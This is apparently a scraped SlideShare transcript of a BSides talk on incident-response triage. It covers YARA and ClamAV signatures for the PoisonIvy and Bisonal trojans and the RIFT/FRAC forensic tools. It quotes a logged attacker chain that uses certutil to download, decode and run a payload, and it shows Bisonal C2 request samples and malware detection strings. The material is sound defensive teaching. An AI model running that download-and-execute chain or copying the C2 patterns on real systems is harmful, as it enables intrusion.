maltype = &quot;Remote Access Trojan&quot;
filetype = &quot;exe&quot;

$string1 = &quot;CONNECT %s:%i HTTP/1.0&quot;
$string2 = &quot;ws2_32&quot;

$s4 = &quot;WS2_32.dll&quot; fullword

)

 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">13. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#13">rule PoisonIvy {
strings:
$s1</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">= &quot;%supdate%4d%02d%02d%02d%02d%02d.tmp&quot; wide ascii
$s2 = &quot;cks=u&quot; wide ascii
$s3 = “CONNECT %s:%i HTTP//1.0” wide ascii
$s4 = “vry7fo/URLDownez{” wide ascii
$s5 = “6u%u.193.%d” wide ascii
$s6 = “/c del %s &gt; nul” wide ascii
$s7 = “%u.193.%d.%d” wide ascii
$s8 = “GET %s HTTP/1.1” wide ascii
condition:
($s1 and $s2 and $s3) or ($s4 and $s5) or ($s6 and $s7 and $s8) and
// MZ signature at offset 0 and ...
uint16(0) == 0x5A4D and
// ... PE signature at offset stored in MZ header at 0x3C
uint32(uint32(0x3C)) == 0x00004550
}
YARA RULES
PoisonIvy Actionable IOC: Yara rule
The first three strings identify the
PoisonIvy generic variants, including
latest ones.
These strings match an old version of
PoisonIvy 2011 packed in UPX.
For the same sample, we use these
strings to match the decompressed
version of PoisonIvy (always 2011).
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">14. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#14">AIOCs formalization process

14
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">15. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#15">• Bisonal is</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">another example. It is a backdoor.
• The malware can be split into two components:
 the main module,
 communication module.
• The main module is responsible for providing the framework to execute the various
components within the malware.
• The communication module is responsible for the sending of information to the server,
receiving new commands from it and downloading of new executable.
• If a new executable is downloaded successfully, it will notifying the main
module to execute it.
• The malware is capable of:
• Listing and controlling processes
• Creating and deleting files
• Creating a remote shell
• Downloading and executing files
• Bisonal is an APT tool.
Trojan.Bisonal
15
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">16. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#16">Trojan.Bisonal traffic

 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">17. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#17">Trojan.Bisonal resulting AIOC</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">description
o Type of malware: Modular Trojan (single stage), mainly used for data stealing
o Capabilities: beaconing, listing and controlling processes, creating and deleting files, creating
remote shells, downloading and executing files
o Dissemination strategy: via Dropper or email attachment
o Architecture: Client / Server using public C2s
o Type of communication: HTTP protocol (in general it uses TCP/80 and TCP/443, but port can be
customized)
o Related Adversary: HeartBeat APT Group (Chinese)
o Earlier Adversary detection: November 2009 (South Korea - TrendMicro)
o Area of operation: actually limited to Asia (including Russia)
o Recorded targets: Mitsubishi Heavy Industries, NEC Corp, Nippon Steel Corp, IHI Corp, several
Ministries in Japan and South Korea.
o Type of AIOCs developed: Yara rules for files, Yara rules for PCAPs, ClamAV rules, Snort Rule,
Registry and logs.
17
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">18. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#18">Bisonal Behavior

rule Trojan.Bisonal</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">{
strings:

Trojan.Bisonal family
the first two strings are
common to other Bisonal
samples, but not all.
The latest samples contain different
strings, except for $s6 string which is
very similar to the first string in
conditition $s1.
These strings match a Bisonal sample
that uses a common obfuscation
techniques(split a word in more
lines).
Beyond the common string “defa” the
samples of bisonal present different
string.

 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">21. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#21">Why ClamAV for</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">AIOCs?

 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">22. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#22">22
Clam AV: Intro
•</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">ClamAV is an open source and free anti-virus program.
• ClamAV runs on Windows (ClamWin), Linux, BSD, Solaris, and Mac OS X, and its
mainly designed to scan email attachment, but it can be used as a regular anti-
virus.
• ClamAV includes:
• Features
• Can search archives
• Can search multiple file types
• Multithreaded
 Clamscan
 Clamdscan/Clamd
 Freshclam
Command line virus scanner
Client/Server virus scanner
tool to update the virus definition database
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">23. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#23">23
YARA Rules, AIOCs</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">and ClamAV
• Yara is the swiss army knife for any low-cost triage and can be applied to many
endpoint forensic platforms.
• Values that work across multiple platforms
• Text strings
• Hex values that are in multiple versions of the binary
• ClamAV provides combination of both worlds.
• By empowering ClamAV with Yara rules, we are able to run massive triage on almost all type
of system using AIOCs we have developed.
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">24. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#24">Using ClamAV to</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">Scan for Badness
clamscan --infected --recursive --allmatch –archive
-verbose --database ./{yara sigs}.yara {starting directory} |
tee clamav_{date}_yara
clamscan --infected --recursive --allmatch --archive-verbose
--database ./{clamav sigs}.ldb {starting directory} | tee
clamav_{date}_sigs
24
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">25. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#25">Using ClamAV: Results</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">Custom Rules - ClamAV

 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">27. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#27">Sigtool: ClamAV command</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">line
27
Sigtool
(signature and database
management tool)
Signature using the hash of
the PE-section of an
executable
Signature using full MD5
hash of file
Signature using the a hex
fragment of a file
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">28. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#28">C:Documents and SettingsuserDesktop&gt;</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">sigtool --md5 malware.exe &gt;&gt; sigFile.hdb
C:Documents and SettingsuserDesktop&gt;type sigFile.hdb
B4619d8058362b38d20480c14d30c209:40500:malware.exe
C:Documents and SettingsuserDesktop&gt; sigtool --mdb malware.exe.text.dat &gt;&gt;
sigFile.mdb
• To create a unique signature for an executable file we use the --md5 option of
sigtool, and then save the output into a file with a “.hdb” extension.
• To create a signature that will match a particular PE section (typically the sections are
labelled .text, .rdata, .data, .idata, etc.), use the “--mdb” option of sigtool and then save
the output into a “.mdb” file. The easiest way to generate MD5 based section signatures is
to extract target PE sections into separate files.
Sigtool: Command explained
28
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">29. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#29">C:Documents and SettingsuserDesktop&gt;</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">echo I am malware | sigtool --hex-dump
4920616d2061206d616c77617265200d0a
C:Documents and SettingsuserDesktop&gt; echo
testSig:0:*:4920616d2061206d616c77617265200d0a &gt;&gt; sigFile.ndb
• The last method is to use Body-based signatures in an hexadecimal format.
It relies on extracted strings from the body of the file.
• In the next example we create an hex dump of the string “I am malware”.
• Next we save the signature that has the format called “Extended Signature”:
MalwareName:TargetType:Offset:HexSignature and redirect the
output to a file “.ndb”.
Sigtool: Command explained
29
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">30. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#30">Generating ClamAV Signatures</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">with IDA with CASC
● ClamAV Signature Creator (CASC)
● How to use it:
https://github.com/Cisco-Talos/CASC/wiki
Open binary in IDA and select Strings Window
Right click and select add string

Select text2

30
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">31. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#31">Generating ClamAV Signatures</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">with IDA with CASC
• Select signature(s) and hit “Create ClamAV Signature” button on the ClamAV Signature Creator view.
• In the popup, find the signature and save to file
Note: Make sure the extension is ldb
4
5
31
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">32. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#32">Remote ClamAV scan</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">with Psexec
 Psexec can execute remote commands
and so start the scan on every computer
of a network.
 To use Psexec, the user must have rights
to access the filesystem of the target
computer.
&gt; psexec 192.168.81.128 -u administrator -p p4ssw0rd1! &quot;C:Program Files (x86)ClamAV
clamscan&quot; -r -d C:bioazih.ndb C:
&gt; psexec DESTINATIONIP -u USER -p PASSWORD “REMOTE_PATH_TO_CLAMSCAN&quot; -r -d
LOCAL_PATH_TO_CLAMAV_DATABASE_FILE REMOTE_PATH_TO_SCAN
Psxec machine
with ClamAV DB
Scanned Host 1
Scanned Host 2
Scanned Host 3
32
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">33. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#33">Remote ClamAV scan</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">with FRAC
 FRAC can be used to scan the network.
 It tracks those IP addresses that cannot
be connected so that can be feed back to
FRAC later for scanning.
 Remember to create a share with clam
databases
 Might be able to scan more 25 boxes at a
time. Do sensitive boxes by hand vs using
FRAC.
FRAC machine
with ClamAV DB
Scanned Host 1
Scanned Host 2
Scanned Host 3
./frac_v0.05.pl --iplist iplist.txt --cmd cmd.txt --verbose
33
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">34. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#34">ClamAV PoisonIvy variants</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">signature
PoisonIvy2015:0:*:257375706461746525346425303264253032642530326425303264253032642e746d70*434f4e4e4543542025733a256920485454502f2f312e30
PoisonIVY2011:0:*:202f632064656c202573203e206e756c*25752e3139332e25642e2564*47455420257320485454502f312e31*757564646f7362656174
PoisonIVY2011UPX:0:*:76727937666f2f55524c446f776e657a7b*365c5c7525752e3139332e2564
The second part contains instead
“CONNECT %s:%i HTTP//1.0”
The first Rule contains two non-successive strings divided by the symbol “*”. The first
string translated from hexadecimal contains the word
“%supdate%4d%02d%02d%02d%02d%02d.tmp”.
This rule takes a Poison Ivy sample dated 2011 and we use 3 different
strings. The first is “/c del %s &gt; nul”
The second strings is
“GET %s HTTP/1.1”
The last matches to
“uuddosbea”
The third rule is the same sample
mentioned above, but without the
package UPX. The first of two strings
is “vry7fo/URLDownez{”
The second strings is
“6u%u.193.%d”
34
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">35. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#35">ClamAV Bisonal -</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">logic signature
BISONAL;Target:1;(0&amp;1&amp;2)|(0&amp;2&amp;3)|(4&amp;5)|(6&amp;7&amp;8);534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e;776b6
b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6c6f;633a5c77696e646f77735c7461736b735c646566612e6578
65;6c6f76652061206d656e67;4845404c2d505368656c6c45;7865637574;776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306
730702f317e6c6f;687474703a2f2f25732f25732e6173703f69643d257325732573;633a5c615c322e747874
BISONAL;Target:1;(0&amp;1&amp;2)|(0&amp;2&amp;3)|(4&amp;5)|(6&amp;7&amp;8)
This is a ClamAV “Body-based”, slightly different, from
the previous one. It has to be put inside a “.LDB” file
and it is possible to use logic operators inside the rule.
Logical operators in action within the BISONAL signature.
Numbers are placeholders for the hex strings.
Match IF found: (both strings 0,1 and 2) OR (both strings
0,2 and 3) OR (only strings 4 and 5) OR (both strings 6,7
and 8).
534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e =
SOFTWAREMicrosoftWindowsCurrentVersionRun
776b6b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6
c6f = wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo
633a5c77696e646f77735c7461736b735c646566612e657865 = c:windowstasksdfea.exe
6c6f76652061206d656e67 = love a meng
4845404c2d505368656c6c45 = HE@L-PShellE
7865637574 = xecut
776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306730702f317e6c6f =

 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">36. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#36">ClamAV and Forensics
●</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">ClamAV can help with Forensics investigations
– Can detect badness in log files
– Example Find:
● Find in the section C of the modsec logs:
●/var/log/httpd/modsec_audit.log: Win.Downloader.CertutilURLCache-6335697-0 FOUND
●certutil -urlcache -split -f http://xx.xx.xx.xx/update.b64 update.b64
●certutil -decode update.b64 update.exe
●update.exe
36
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">37. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#37">• Actionable IOCs</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">is an answer to the need of solid indicators to support the investigation, the
attribution and the triage, of incidents generated by malicious actors.
• The adoption of this methodology can positively impact investigation and triage, but also
improves knowledge of the tools and strategies adopted by the adversaries.
• The formalization process behind it can facilitate the exchange of information and
indicators without the risk of unintentional leakage of sensitive information and, in short,
strengthen the proactive and reactive capabilities of any structure.
Where are we heading

00:31:59 UTC","description":"The document discusses practical incident response in heterogeneous environments and overcoming limitations of traditional approaches. It proposes utilizing intelligence-driven investigation and actionable IOCs to more flexibly shape the triage process across different operating systems. Examples are provided of using software fingerprinting and debugging symbols to attribute malware and build structured knowledge bases of attackers.","downloadKey":"225337519442d77ac7a3291c973dca4f035dd213eb513acbd6043d2362e5e09d","editorsNotes":[],"emailShareUrl":"mailto:?subject=Check out this SlideShare out this SlideShare : https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401","strippedTitle":"bsides-ir-in-heterogeneous-environment","thumbnail":"https://cdn.slidesharecdn.com/ss_thumbnails/bsidesfinal-180515003159-thumbnail.jpg?width=640\u0026height=640\u0026fit=bounds","title":"BSides IR in Heterogeneous Environment","totalSlides":38,"transcript":["Practical Incident Response in\nHeterogeneous Environment\nKeven Murphy \u0026 Stefano Maccaglia\n1\n ","The mass-triage problem in 2018\n• The investigation process (Triage), in any IT incident, is the key to solve the case and\nto clean all the affected systems.\n• But in heterogeneous environments, where Windows, Linux, Mac OS, and Unix\nsystems are potentially affected by the attacker, the investigation process is slowed\nby a number of technical complexities.\n First problem is related to a common platform and procedure to adopt for the triage as many\ntechnologies are capable of covering only a portion of the environment.\n Second problem, what to look for, as the triage is aimed to identify malicious artifacts and usual\ntechnologies are not providing flexibility and agility to shape the triage process.\n Third problem, the capability to search the heterogeneous environment using custom IOCs.\n Fourth problem, the possibility to pinpoint known badness which allows for easier mitigation.\n• In our approach, the IOCs play an important role both for the investigation process\nand the definition of the best way to approach the triage. We were looking to a\n“rule them all” solution aimed to overcome traditional limitations of the most\ncommon commercial solutions.\n2\n ","Traditional IOCs application\n• The traditional IR approach:\n• Context, in regard of IOCs, typically does not exists.\n• Application of IOCs to the environment is rule-based\n• Customization of IOCs are not an option in some commercial products.\n• Rule-based detection will miss changes made to the actor’s tools\n3\n ","Our idea\n• The production of code leaves traces in any binary.\n• The binary can contain debugging symbols, which give you a lot of information.\n• Often the attacker tools include the use of specific libraries or functions.\n• A lot of fingerprinting can be done with software, an this is very useful for IR\nanalyses.\n• The combined information of both can help to solve the attribution problem.\n• Helps with assessment of risks\n• Identifying end goals for known actors\n• Aid the creation of IOCs that are “actionable” and not “disposable”\n4\n ","RIFT (Retrieve Interesting Files Tool)\n● Retrieves files/directories based on regex list\n● Uses Sleuthkit to retrieve files forensically\n● Outputs files files into a directory (machine name)\n● Retrieved files are saved remote share/USB\n● Recreates the directory structure of where the file was found\n● To run:\n● Download:\nrift --verbose --savedrive [SAVEDRIVE]\nhttps://github.com/chaoticmachinery/frac_rift\n5\n ","Getfileslist.txt examples\n● “getfileslist.txt” contains a regex list of files and directories that RIFT will retrieve\n6\nntuser.dat$\nsystem32/winevt/logs/\n^/etc/\n.ssh\n ","FRAC (Forensic Response ACquisition)\n● Uses RIFT to forensically retrieve files/directories across the network\n● Recommend using PAExec or SSH/SSHPASS to connect to remote machines\n● Requires local admin rights and remote share (SMB/NFS depending on OS)\n● Supports single IP, CIDR notation, and IP range like the following examples:\n● Can be used to execute any command on remote machines\n● To run:\n–172.16.10.12\n–172.16.10.1/24\n–172.16.10.1-172.16.10.230\nfrac_v0.05 --iplist iplist.txt --cmd cmd.txt –verbose\npaexec.exe [IP] -n 4 -u [ADMINID] -p [ADMINPASS] -s cmd /C \"net use\n[SHAREDRV] /delete /yes \u0026 net use [SHAREDRV] [SHARE]\n/user:[SHAREUSERID] [SHAREPASSWD] \u0026\u0026 cd /d [SAVEDRIVE] \u0026\u0026 rift.exe --\nverbose --savedrive [SAVEDRIVE] \u0026\u0026 net use [SHAREDRV] /delete /yes\"\nsshpass -p [ADMINPASS] ssh [IP] \"mkdir [SHAREDRV];mount [MNTOPTS]\n[SRCBOX]:[SRCMNT] [SHAREDRV] ; cd [SHAREDRV]/frac_v0.05 \u0026\u0026 ./rift --\nverbose --savedrive [SAVEDRIVE] ; cd / \u0026\u0026 umount [SHAREDRV] \u0026\u0026 rmdir\n[SHAREDRV]\"\nExamples\nof\nCmd.Txt\n7\n ","FRAC (Forensic Response Acquisition): The Output\n● FRAC/RIFT creates directories with the hostname of the machine\ndrwxr-xr-x 7 root root 4096 Apr 11 19:39 machinea_04112018_19-18-58\ndrwxr-xr-x 9 root root 4096 Apr 11 20:11 machineb_04112018_15-19-02\ndrwxr-xr-x 135 root root 20480 Apr 11 19:37 etc\n-rw-r--r-- 1 root root 675539 Apr 11 19:40 getfiles.txt\ndrwxr-xr-x 3 root root 4096 Apr 11 19:37 home\ndrwxr-xr-x 3 root root 4096 Apr 11 19:37 opt\ndrwxr-xr-x 5 root root 4096 Apr 11 19:21 root\n-rw-r--r-- 1 root root 230661477 Apr 11 19:43 machineb_04112018_15-19-28_fls.out\ndrwxr-xr-x 5 root root 4096 Apr 11 19:38 usr\ndrwxr-xr-x 5 root root 4096 Apr 11 19:40 var\nGetfiles.txt\nContains the mactime information for all of the files retrieved as well as the inode\n*fls.out\nContains the fls.out (mactime) output from the Sleuthkit FLS command.\nAll of the directory structure is recreated and files are forensically copied to where\nthey existed on the drive.\n8\n ","Actionable IOCs (AIOCs)\n• The concept of “actionable” IOCs has been derived and refined from a collective set of\nIncident Response investigations, and could become a valid support of our investigative\nprocess if organized in a scientifically sound approach.\n• Utilizes procedures, analysis, and evidence for a methodical approach\n• Based on positive matches can help identify the attacker\n• It allow the creation of a structured knowledge base of attackers\n• The knowledge base allows the creation of attacker profiles\n9\n ","Malware analysis process to build AIOCs\n10\n ","Example: PoisonIvy\n• PoisonIvy, a Remote Access Tool/Trojan (RAT) often used in targeted attacks, had been\nwidely seen until around 2013.\n• Since then, the number of cases using PoisonIvy decreased, and there was no special\nvariant with expanded features seen in the wild.\n• However, recently, we identified PoisonIvy with expanded features in its communication\nfunction capable to bypass HTTP/HTTPS proxy in APT and cybercriminal attacks thanks to\nmodifications in the malware code.\nLatest PoisonIvy variants are different\n11\n ","YARA RULES\nPoisonIvy typical IOC\nrule poisonivy_1 : rat\n{\nmeta:\ndescription = \"Poison Ivy\"\nauthor = \"Jean-Philippe Teissier / @Jipe_\"\ndate = \"2013-02-01\"\nfiletype = \"memory\"\nversion = \"1.0\"\nref1 = \"https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py\nstrings:\n$a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C\n6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63\n74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C }\ncondition:\n$a\n}\nrule PoisonIvy_2\n{\nmeta:\nauthor = \" Kevin Breen \u003ckevin@techanarchy.net\u003e\"\ndate = \"2014/04\"\nref = \"http://malwareconfig.com/stats/PoisonIvy\"\nmaltype = \"Remote Access Trojan\"\nfiletype = \"exe\"\nstrings:\n$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}\n$string1 = \"CONNECT %s:%i HTTP/1.0\"\n$string2 = \"ws2_32\"\n$string3 = \"cks=u\"\n$string4 = \"thj@h\"\n$string5 = \"advpack\"\ncondition:\n$stub at 0x1620 and all of ($string*) or (all of them)\n}\n} rule PoisonIvy_Generic_3 {\nmeta:\ndescription = \"PoisonIvy RAT Generic Rule\"\nauthor = \"Florian Roth\"\ndate = \"2015-05-14\"\nhash = \"e1cbdf740785f97c93a0a7a01ef2614be792afcd\"\nstrings:\n$k1 = \"Tiger324{\" fullword ascii\n$s2 = \"WININET.dll\" fullword ascii\n$s3 = \"mscoree.dll\" fullword wide\n$s4 = \"WS2_32.dll\" fullword\n$s5 = \"Explorer.exe\" fullword wide\n$s6 = \"USER32.DLL\"\n$s7 = \"CONOUT$\"\n$s8 = \"login.asp\"\n$h1 = \"HTTP/1.0\"\n$h2 = \"POST\"\n$h3 = \"login.asp\"\n$h4 = \"check.asp\"\n$h5 = \"result.asp\"\n$h6 = \"upload.asp\"\ncondition:\nuint16(0) == 0x5a4d and filesize \u003c 500KB and\n(\n$k1 or all of ($s*) or all of ($h*)\n)\nrule PoisonIvy_Sample_APT {\nmeta:\ndescription = \"Detects a PoisonIvy APT malware group\"\nauthor = \"Florian Roth\"\nreference = \"VT Analysis\"\ndate = \"2015-06-03\"\nhash = \"b874b76ff7b281c8baa80e4a71fc9be514093c70\"\nstrings:\n$s0 = \"pidll.dll\" fullword ascii\n$s1 = \"sens32.dll\" fullword wide\n$s3 = \"FileDescription\" fullword wide\n$s4 = \"OriginalFilename\" fullword\n$s5 = \"ZwSetInformationProcess\" fullword ascii\n$s9 = \"Microsoft Media Device Service Provider\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize \u003c 47KB and all of them\n} 12\n ","rule PoisonIvy {\nstrings:\n$s1 = \"%supdate%4d%02d%02d%02d%02d%02d.tmp\" wide ascii\n$s2 = \"cks=u\" wide ascii\n$s3 = “CONNECT %s:%i HTTP//1.0” wide ascii\n$s4 = “vry7fo/URLDownez{” wide ascii\n$s5 = “6u%u.193.%d” wide ascii\n$s6 = “/c del %s \u003e nul” wide ascii\n$s7 = “%u.193.%d.%d” wide ascii\n$s8 = “GET %s HTTP/1.1” wide ascii\ncondition:\n($s1 and $s2 and $s3) or ($s4 and $s5) or ($s6 and $s7 and $s8) and\n// MZ signature at offset 0 and ...\nuint16(0) == 0x5A4D and\n// ... PE signature at offset stored in MZ header at 0x3C\nuint32(uint32(0x3C)) == 0x00004550\n}\nYARA RULES\nPoisonIvy Actionable IOC: Yara rule\nThe first three strings identify the\nPoisonIvy generic variants, including\nlatest ones.\nThese strings match an old version of\nPoisonIvy 2011 packed in UPX.\nFor the same sample, we use these\nstrings to match the decompressed\nversion of PoisonIvy (always 2011).\n ","AIOCs formalization process\nAtomic\nIOCs\nHigh order Yara\nrules for files\nand packets\nActor tags and\nattack\ndescriptions\nActor tools\nHigh order\nClamAV signature\nHigh order log and\nsystem artifacts\nSystem and\nnetwork\nvisibility\nAlternative\nSystem\nvisibility\nLog and\nartifacts\nvisibility\nClassification and attribution\nVirustotal\nand other\nrepository\nsearches\nEvolutive and comparative analysis\nformalization\n14\n ","• Bisonal is another example. It is a backdoor.\n• The malware can be split into two components:\n the main module,\n communication module.\n• The main module is responsible for providing the framework to execute the various\ncomponents within the malware.\n• The communication module is responsible for the sending of information to the server,\nreceiving new commands from it and downloading of new executable.\n• If a new executable is downloaded successfully, it will notifying the main\nmodule to execute it.\n• The malware is capable of:\n• Listing and controlling processes\n• Creating and deleting files\n• Creating a remote shell\n• Downloading and executing files\n• Bisonal is an APT tool.\nTrojan.Bisonal\n15\n ","Trojan.Bisonal traffic\n• Custom “flag” and c2 domain – used to track victim\n16\nGET /j/news.asp?id=* HTTP/1.1\nUser-Agent: flag:khi host:Business IP:10.0.0.51\nOS:XPSP3 vm:.. proxy:..\nHost: online.cleansite.us\nCache-Control: no-cache\n----------------\nGET /a.asp?id=* HTTP/1.1\nAccept:*/*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0;\nWindows NT 5.1; Trident/4.0;.NET CLR 2.0.50727;\n.NET CLR 3.0.04.506.648;.NET CLR 3.5.21002)\nHost: khi.acmetoy.com\nConnection: Keep-Alive\nGET\n/rc/news1.asp?id=flag:831nec%20host:Remote%20PC%20\nIP:169.254.100.211%20OS:XPSP3%20vm:..%20proxy:..\nHTTP/1.1\nUser-Agent: flag:831nec host:Remote PC\nIP:169.254.100.211\nOS:XPSP3 vm:?? proxy:??\nHost: online.4pu.com\n----------------\nGET /a.asp?id=* HTTP/1.1\nAccept:*/*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0;\nWindows NT 5.1; Trident/4.0;.NET CLR 